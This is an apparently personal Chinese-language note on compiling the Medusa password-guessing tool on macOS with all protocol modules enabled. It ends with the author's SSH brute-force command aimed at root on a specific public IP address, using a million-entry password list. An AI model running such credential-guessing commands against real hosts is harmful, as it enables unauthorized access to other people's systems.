# Mac OS安装Medusa

> 关于`Medusa`可参考https://github.com/jmk-foofus/medusa

这玩意最坑的就是官方给出的下载安装方式太不清晰了，默认情况下啥模块都没安装，简直坑人

```shell
#getting the source
git clone https://github.com/jmk-foofus/medusa
cd medusa

#macOS dependencies
brew install freerdp
$ export FREERDP2_CFLAGS='-I/usr/local/include'
$ export FREERDP2_LIBS='-I/usr/local/lib/freerdp'

#building
./configure --enable-debug=yes --enable-module-afp=yes --enable-module-cvs=yes --enable-module-ftp=yes --enable-module-http=yes --enable-module-imap=yes --enable-module-mssql=yes --enable-module-mysql=yes --enable-module-ncp=yes --enable-module-nntp=yes --enable-module-pcanywhere=yes --enable-module-pop3=yes --enable-module-postgres=yes --enable-module-rexec=yes --enable-module-rlogin=yes --enable-module-rsh=yes --enable-module-smbnt=yes --enable-module-smtp=yes --enable-module-smtp-vrfy=yes --enable-module-snmp=yes --enable-module-ssh=yes --enable-module-svn=yes --enable-module-telnet=yes --enable-module-vmauthd=yes --enable-module-vnc=yes --enable-module-wrapper=yes --enable-module-web-form=yes
make && make install

#executing
./src/medusa
```

如果使用`SSH`功能可能出现缺少`libssh2`模块的提示，可使用命令`brew install libssh2`进行安装，安装完需重新编译`Medusa`。即`make clean`后重新编译安装。以下是我使用`SSH`破解时使用到的命令

```shell
./src/medusa -M ssh -h 47.75.52.11 -u root -P ~/Downloads/10_million_password_list_top_1000000.txt -e ns -t 5 -f
```

